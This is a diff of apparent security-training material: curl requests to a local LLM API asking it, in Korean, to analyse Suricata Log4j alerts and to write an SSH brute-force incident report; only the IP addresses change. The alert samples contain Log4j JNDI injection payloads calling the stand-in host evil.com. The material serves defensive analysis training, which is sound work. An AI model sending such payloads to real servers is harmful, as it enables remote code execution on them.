@@ -570,7 +570,7 @@ curl -X POST http://192.168.0.109:11434/api/chat \
       },
       {
         "role": "user",
-        "content": "다음 Suricata 알림을 분석해주세요:\n\n[**] [1:2024897:3] ET EXPLOIT Apache Log4j RCE Attempt (http ldap) [**]\n[Classification: Attempted Administrator Privilege Gain] [Priority: 1]\n03/27-10:15:33.123456  10.0.0.100:54321 -> 10.20.30.80:8080\nTCP TTL:64 TOS:0x0 ID:54321 IpLen:20 DgmLen:1024\nPayload: ${jndi:ldap://evil.com/a}\n\n[**] [1:2024897:3] ET EXPLOIT Apache Log4j RCE Attempt (http ldap) [**]\n[Classification: Attempted Administrator Privilege Gain] [Priority: 1]\n03/27-10:15:34.234567  10.0.0.100:54322 -> 10.20.30.80:8080\nPayload: ${jndi:ldap://evil.com/b}"
+        "content": "다음 Suricata 알림을 분석해주세요:\n\n[**] [1:2024897:3] ET EXPLOIT Apache Log4j RCE Attempt (http ldap) [**]\n[Classification: Attempted Administrator Privilege Gain] [Priority: 1]\n03/27-10:15:33.123456  10.0.0.100:54321 -> 10.20.40.82:80\nTCP TTL:64 TOS:0x0 ID:54321 IpLen:20 DgmLen:1024\nPayload: ${jndi:ldap://evil.com/a}\n\n[**] [1:2024897:3] ET EXPLOIT Apache Log4j RCE Attempt (http ldap) [**]\n[Classification: Attempted Administrator Privilege Gain] [Priority: 1]\n03/27-10:15:34.234567  10.0.0.100:54322 -> 10.20.40.82:80\nPayload: ${jndi:ldap://evil.com/b}"
       }
     ],
     "stream": false,
@@ -596,7 +596,7 @@ curl -X POST http://192.168.0.109:11434/api/chat \
       },
       {
         "role": "user",
-        "content": "다음 정보를 인시던트 보고서로 작성해줘:\n\n- 일시: 2026-03-27 03:15\n- 대상: web 서버 (10.20.30.80)\n- 공격 유형: SSH 브루트포스\n- 출발지 IP: 185.220.101.42 (Tor 출구 노드)\n- 시도 횟수: 500회\n- 결과: root 계정으로 로그인 성공\n- 탐지 수단: Wazuh SIEM 알림\n- 현재 상태: 해당 세션 아직 활성 중"
+        "content": "다음 정보를 인시던트 보고서로 작성해줘:\n\n- 일시: 2026-03-27 03:15\n- 대상: web 서버 (10.20.32.80)\n- 공격 유형: SSH 브루트포스\n- 출발지 IP: 185.220.101.42 (Tor 출구 노드)\n- 시도 횟수: 500회\n- 결과: root 계정으로 로그인 성공\n- 탐지 수단: Wazuh SIEM 알림\n- 현재 상태: 해당 세션 아직 활성 중"
       }
     ],
     "stream": false,
